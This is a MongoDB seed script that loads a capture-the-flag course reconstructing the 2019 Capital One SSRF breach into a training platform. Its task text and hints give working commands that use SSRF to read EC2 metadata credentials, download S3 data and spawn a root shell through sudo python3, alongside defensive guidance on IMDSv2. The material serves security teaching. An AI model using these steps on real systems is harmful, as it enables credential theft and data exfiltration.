// ============================================================================
// AWS Autopsy — MongoDB Seed Script
//
// Seeds the XploitVerse database with:
//   1. A Lab document (for the Docker lab launch flow)
//   2. A Course document (for the course content flow)
//   3. 5 Module documents (one per attack stage)
//   4. 5 Task documents (one flag-type task per module)
//
// Usage:
//   mongosh mongodb://localhost:27017/xploitverse < seed.js
//
// ============================================================================

// Switch to the xploitverse database
db = db.getSiblingDB("xploitverse");

print("=== AWS Autopsy — Seeding XploitVerse Database ===\n");

// ── 1. Lab Document ────────────────────────────────────────────────────────

const labResult = db.labs.insertOne({
    title: "AWS Autopsy: Capital One SSRF Breach",
    description:
        "Recreate the 2019 Capital One data breach ($80M fine). Exploit SSRF to steal IAM credentials via IMDSv1, then exfiltrate sensitive S3 data — all in a safe, isolated Docker environment. Based on a real breach, reconstructed for educational purposes.",
    difficulty: "Hard",
    category: "Red Team",
    estimatedDuration: 90,
    objectives: [
        "Discover and exploit the SSRF vulnerability in the web application",
        "Access the EC2 Instance Metadata Service via IMDSv1",
        "Steal temporary IAM role credentials",
        "Authenticate to S3 using stolen credentials",
        "Exfiltrate sensitive customer data from S3 buckets",
        "Understand IMDSv2 and other defensive mitigations",
    ],
    tools: ["curl", "python3", "nmap", "jq", "wget"],
    tags: [
        "AWS",
        "SSRF",
        "IAM",
        "Cloud Security",
        "Capital One",
        "IMDSv1",
        "S3",
        "Breach Reconstruction",
    ],
    environmentConfig: {
        instanceType: "t2.micro",
        ports: [5000, 8000, 9000],
    },
    dockerImage: "xv-aws-autopsy",
    memoryMb: 768,
    isActive: true,
    isPublished: true,
    timesCompleted: 0,
    averageRating: 0,
    createdAt: new Date(),
    updatedAt: new Date(),
});

const labId = labResult.insertedId;
print(`[+] Lab created: ${labId}`);

// ── 2. Course Document ─────────────────────────────────────────────────────

const courseResult = db.courses.insertOne({
    title: "AWS Autopsy: Real Breach Reconstruction",
    slug: "aws-autopsy",
    description:
        "Dissect real AWS breaches hands-on. Recreate the Capital One SSRF attack step by step — understand every link in the kill chain, steal credentials, exfiltrate data, and learn how to defend against it. Based on the AWS-Autopsy project.",
    difficulty: "Hard",
    category: "Cloud Security",
    tags: [
        "AWS",
        "Cloud",
        "SSRF",
        "IAM",
        "Breach Analysis",
        "S3",
        "Capital One",
    ],
    isPremium: false,
    isPublished: true,
    createdAt: new Date(),
    updatedAt: new Date(),
});

const courseId = courseResult.insertedId;
print(`[+] Course created: ${courseId}`);

// ── 3. Module Documents ────────────────────────────────────────────────────

const modules = [
    {
        courseId: courseId,
        title: "Reconnaissance & SSRF Discovery",
        description:
            "Explore the target web application, identify endpoints, and discover the Server-Side Request Forgery vulnerability.",
        order: 1,
        pointsReward: 100,
        isPublished: true,
        createdAt: new Date(),
        updatedAt: new Date(),
    },
    {
        courseId: courseId,
        title: "SSRF → EC2 Metadata Exploitation",
        description:
            "Leverage the SSRF vulnerability to reach the EC2 Instance Metadata Service and understand IMDSv1 vs IMDSv2.",
        order: 2,
        pointsReward: 150,
        isPublished: true,
        createdAt: new Date(),
        updatedAt: new Date(),
    },
    {
        courseId: courseId,
        title: "IAM Credential Theft",
        description:
            "Extract temporary IAM role credentials from the metadata service and understand their scope and permissions.",
        order: 3,
        pointsReward: 200,
        isPublished: true,
        createdAt: new Date(),
        updatedAt: new Date(),
    },
    {
        courseId: courseId,
        title: "S3 Data Exfiltration",
        description:
            "Use the stolen credentials to authenticate to S3, enumerate buckets, and exfiltrate sensitive customer data.",
        order: 4,
        pointsReward: 250,
        isPublished: true,
        createdAt: new Date(),
        updatedAt: new Date(),
    },
    {
        courseId: courseId,
        title: "Defensive Mitigations & Root Challenge",
        description:
            "Learn the defensive controls that would have prevented this breach: IMDSv2, least-privilege IAM, VPC endpoints, and WAF SSRF rules. Then conquer the root challenge.",
        order: 5,
        pointsReward: 300,
        isPublished: true,
        createdAt: new Date(),
        updatedAt: new Date(),
    },
];

const moduleResults = db.modules.insertMany(modules);
const moduleIds = Object.values(moduleResults.insertedIds);
print(`[+] ${moduleIds.length} modules created`);

// ── 4. Task Documents ──────────────────────────────────────────────────────
// Each task is a flag-submission challenge tied to a module.
// flagHash values are SHA-256 hashes of the flag strings.

const tasks = [
    {
        moduleId: moduleIds[0],
        title: "Find the SSRF Vulnerability",
        type: "flag",
        order: 1,
        prompt: "Submit the SSRF discovery flag",
        contentMd: `# Stage 1: Reconnaissance & SSRF Discovery

## Background — The Capital One Breach

In March 2019, a former AWS employee named Paige Thompson exploited a misconfigured
Web Application Firewall (WAF) running on an EC2 instance. The WAF had an endpoint
that could be tricked into making server-side HTTP requests to arbitrary URLs —
a vulnerability known as **Server-Side Request Forgery (SSRF)**.

## Your Mission

A web application is running on **port 5000** inside this lab environment.
It simulates the Capital One WAF management console.

1. Explore the web application — check all available endpoints
2. Read the HTML source carefully (comments can be revealing)
3. Find the URL fetching endpoint
4. Test it with an external URL to confirm SSRF
5. Find the flag hidden in the web application directory

## Flag Location

Once you've confirmed the SSRF exists, look for the flag file at:
\`/opt/webapp/.flag_ssrf.txt\`

## Commands to Get Started

\`\`\`bash
# Explore the web app
curl http://localhost:5000/
curl http://localhost:5000/status
curl http://localhost:5000/docs

# Test the SSRF
curl "http://localhost:5000/fetch?url=http://example.com"
\`\`\`
`,
        hints: [
            "Check the /docs endpoint for API documentation",
            "The /fetch endpoint accepts a 'url' parameter",
            "Try: curl 'http://localhost:5000/fetch?url=http://localhost:5000/status'",
        ],
        points: 100,
        hintPenalty: 20,
        flagHash:
            "d4af49ae7064d12fd9df165c21f54fb88ed34165446064a80b46e8c60906b8ab",
        isPublished: true,
        createdAt: new Date(),
        updatedAt: new Date(),
    },
    {
        moduleId: moduleIds[1],
        title: "Access EC2 Metadata via SSRF",
        type: "flag",
        order: 1,
        prompt: "Submit the metadata leak flag",
        contentMd: `# Stage 2: SSRF → EC2 Metadata Exploitation

## The Real Attack

In the actual breach, the attacker used the SSRF to query the **EC2 Instance Metadata Service**
at the link-local address \`169.254.169.254\`. This service provides information about the
running EC2 instance, including **temporary IAM credentials**.

## IMDSv1 vs IMDSv2

- **IMDSv1** (vulnerable): Simple GET requests, no authentication required
- **IMDSv2** (secure): Requires a session token obtained via a PUT request with a TTL header

Capital One was still using **IMDSv1** at the time of the breach.

## Your Mission

1. Use the SSRF endpoint to reach the metadata service at \`169.254.169.254\`
2. Navigate the metadata API to find IAM-related information
3. Discover the IAM role attached to the instance
4. Find the flag in the metadata service directory

## Key Metadata Endpoints

\`\`\`
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
\`\`\`

## Flag Location

\`/opt/metadata/.flag_metadata.txt\`
`,
        hints: [
            "Use the SSRF: curl 'http://localhost:5000/fetch?url=http://169.254.169.254/latest/meta-data/'",
            "Navigate to /latest/meta-data/iam/ to find IAM information",
            "If 169.254.169.254 doesn't work, try localhost:8000 directly",
        ],
        points: 150,
        hintPenalty: 30,
        flagHash:
            "f212d54d9cd7153d8a38b01f147689bde59389f57e1a1a34293548386082a8b5",
        isPublished: true,
        createdAt: new Date(),
        updatedAt: new Date(),
    },
    {
        moduleId: moduleIds[2],
        title: "Steal IAM Role Credentials",
        type: "flag",
        order: 1,
        prompt: "Submit the credential theft flag",
        contentMd: `# Stage 3: IAM Credential Theft

## The Critical Moment

This is where the real breach became catastrophic. By querying the metadata service's
IAM security-credentials endpoint, the attacker obtained **temporary AWS credentials**:

- \`AccessKeyId\`
- \`SecretAccessKey\`
- \`Token\`

These credentials inherited all permissions of the IAM role attached to the EC2 instance.
In Capital One's case, the role (\`CapitalOne-WAF-Role\`) had **read access to S3 buckets**
containing sensitive customer data.

## Your Mission

1. Use SSRF to query the IAM security-credentials endpoint
2. Find the role name
3. Retrieve the full credentials (AccessKeyId, SecretAccessKey, Token)
4. Verify the credentials work by authenticating to the S3 service (port 9000)

## Key Steps

\`\`\`bash
# Step 1: List IAM roles via SSRF
curl "http://localhost:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Step 2: Get credentials for the role
curl "http://localhost:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME_HERE"

# Step 3: Test credentials against S3
curl -H "X-Access-Key: ACCESS_KEY_HERE" -H "X-Secret-Key: SECRET_KEY_HERE" http://localhost:9000/
\`\`\`

## Flag Location

\`/opt/s3data/.flag_creds.txt\`

> **Note**: This flag is accessible once you successfully authenticate to the S3 service.
`,
        hints: [
            "The IAM role name is shown when you query /latest/meta-data/iam/security-credentials/",
            "Use the role name to get full credentials from /latest/meta-data/iam/security-credentials/<role-name>",
            "Authenticate to S3 with: curl -H 'X-Access-Key: <key>' -H 'X-Secret-Key: <secret>' http://localhost:9000/",
        ],
        points: 200,
        hintPenalty: 40,
        flagHash:
            "897cae2018e05820534124ca67c83bdd0f0a072baf556e10ccbca694dda0c0f6",
        isPublished: true,
        createdAt: new Date(),
        updatedAt: new Date(),
    },
    {
        moduleId: moduleIds[3],
        title: "Exfiltrate S3 Data",
        type: "flag",
        order: 1,
        prompt: "Submit the data exfiltration flag",
        contentMd: `# Stage 4: S3 Data Exfiltration

## The Damage

In the real breach, Paige Thompson used the stolen credentials to run:

\`\`\`bash
aws s3 ls s3://capitalone-sensitive/
aws s3 sync s3://capitalone-sensitive/ ./stolen-data/
\`\`\`

This exposed:
- **100 million** credit card applications
- **140,000** Social Security numbers
- **80,000** bank account numbers
- Personal information from the US and Canada

Capital One was fined **$80 million** by the OCC and agreed to a **$190 million** settlement.

## Your Mission

1. Use the stolen credentials to list all S3 buckets
2. Enumerate objects in the \`capitalone-sensitive\` bucket
3. Download and examine the sensitive data files
4. Find the exfiltration flag hidden in the bucket

## Key Commands

\`\`\`bash
# List all buckets
curl -H "X-Access-Key: ACCESS_KEY" -H "X-Secret-Key: SECRET_KEY" \\
    http://localhost:9000/list

# List objects in a bucket
curl -H "X-Access-Key: ACCESS_KEY" -H "X-Secret-Key: SECRET_KEY" \\
    http://localhost:9000/list/capitalone-sensitive

# Read a specific file
curl -H "X-Access-Key: ACCESS_KEY" -H "X-Secret-Key: SECRET_KEY" \\
    http://localhost:9000/get/capitalone-sensitive/customer-records/us_customers_2019.json
\`\`\`

## Flag Location

The flag is hidden inside the \`capitalone-sensitive\` bucket.
Look for hidden files (filenames starting with \`.\`)
`,
        hints: [
            "List the bucket contents with /list/capitalone-sensitive",
            "Look for hidden files — try /list/capitalone-sensitive and check for dot-files",
            "The flag is at /get/capitalone-sensitive/.flag_exfil.txt",
        ],
        points: 250,
        hintPenalty: 50,
        flagHash:
            "61d93a6ce1f1aedc11f4f0c58e7707aecaa136c81f406b4c24ed72538e82bd09",
        isPublished: true,
        createdAt: new Date(),
        updatedAt: new Date(),
    },
    {
        moduleId: moduleIds[4],
        title: "Root the System & Learn Defenses",
        type: "flag",
        order: 1,
        prompt: "Submit the root flag",
        contentMd: `# Stage 5: Root Challenge & Defensive Mitigations

## What Went Wrong?

The Capital One breach exploited multiple failures simultaneously:

| Failure | Description | Fix |
|---------|-------------|-----|
| **SSRF** | No URL validation on the WAF proxy | Input validation, URL allowlisting |
| **IMDSv1** | Metadata accessible with simple GET | **Migrate to IMDSv2** (token-based) |
| **Overpermissive IAM** | WAF role had broad S3 read access | **Least-privilege IAM policies** |
| **No S3 encryption** | Data at rest not encrypted | Enable SSE-S3/SSE-KMS |
| **No VPC Endpoint** | S3 accessed over public internet | **Use VPC endpoints** for S3 |
| **No WAF rules** | No SSRF detection rules | Deploy AWS WAF with SSRF rules |

## IMDSv2 — The Fix

\`\`\`bash
# IMDSv1 (vulnerable) — anyone can read:
curl http://169.254.169.254/latest/meta-data/

# IMDSv2 (secure) — requires token:
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \\
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \\
    http://169.254.169.254/latest/meta-data/
\`\`\`

## Root Challenge

Now prove your skills by escalating privileges on this system.

**Hint**: Check what commands you can run with \`sudo -l\`

\`\`\`bash
sudo -l
# If python3 is allowed...
sudo python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
cat /root/root.txt
\`\`\`

## Flag Location

\`/root/root.txt\` — readable only by root
`,
        hints: [
            "Run 'sudo -l' to see what commands you can run with elevated privileges",
            "Python3 is available via sudo — you can spawn a root shell with it",
            "sudo python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
        ],
        points: 300,
        hintPenalty: 60,
        flagHash:
            "610deabf0718e4a585f8178552d1ee20d4b2a09c3b848deee9eff3c0adc59edc",
        isPublished: true,
        createdAt: new Date(),
        updatedAt: new Date(),
    },
];

const taskResults = db.tasks.insertMany(tasks);
const taskIds = Object.values(taskResults.insertedIds);
print(`[+] ${taskIds.length} tasks created`);

// ── Summary ────────────────────────────────────────────────────────────────
print("\n=== Seeding Complete ===");
print(`Lab ID:    ${labId}`);
print(`Course ID: ${courseId}`);
print(`Modules:   ${moduleIds.join(", ")}`);
print(`Tasks:     ${taskIds.join(", ")}`);
print("\nThe AWS Autopsy lab is now available in XploitVerse!");
print("- Course: /courses/aws-autopsy");
print("- Lab: visible in the Labs dashboard");
print("\nTo build the Docker image:");
print("  docker build -t xv-aws-autopsy ./challenges/aws-autopsy/");
